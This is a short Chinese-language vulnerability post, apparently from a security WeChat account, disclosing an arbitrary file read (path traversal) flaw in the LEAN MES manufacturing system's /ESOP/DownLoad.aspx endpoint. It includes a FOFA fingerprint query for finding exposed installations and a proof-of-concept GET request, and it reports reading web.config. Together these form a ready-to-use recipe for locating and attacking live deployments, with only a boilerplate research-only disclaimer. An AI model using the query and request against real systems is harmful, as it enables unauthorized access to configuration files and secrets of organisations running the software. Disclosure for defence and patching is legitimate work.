#  【0day】深科特 LEAN MES系统 DownLoad.aspx 任意文件读取漏洞  
 0day收割机   2026-03-26 13:17  
  
# 漏洞简介  
  
LEAN MES系统是由深圳市深科特信息技术有限公司开发的一款应用系统，主要用于生产调度、产品跟踪、质量控制等车间管理功能。LEAN MES精益制造执行系统通过强调制造过程的信息化和透明化，帮助企业由粗放式向精益化管理模式升级。该系统 /ESOP/DownLoad.aspx 存在任意文件读取漏洞。攻击者可通过构造恶意请求，利用路径遍历（目录穿越）漏洞，实现任意文件读取，影响范围包括系统数据访问权限，可能导致敏感信息泄露，为后续攻击提供便利。  
# 影响版本  
# fofa语法  
> (title="LEAN MES - 用户登录" && body="LEAN MES") || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"  
  
# 漏洞复现  
```
GET /ESOP/DownLoad.aspx?fileName=file_to_read&Action=PLM HTTP/1.1Host:
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWCAlcXuO64Tp0tSmRA3ibo78ryFV6wWQvw2Ulh28f1icKPQfI2VYrbbMkdsjAiacx7ic7RVtwTkTfnccia5Cl8oP3Mzwrp5xKsVelJU/640?wx_fmt=png&from=appmsg "")  
  
成功读取到了web.config配置文件  
  
仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。  
  
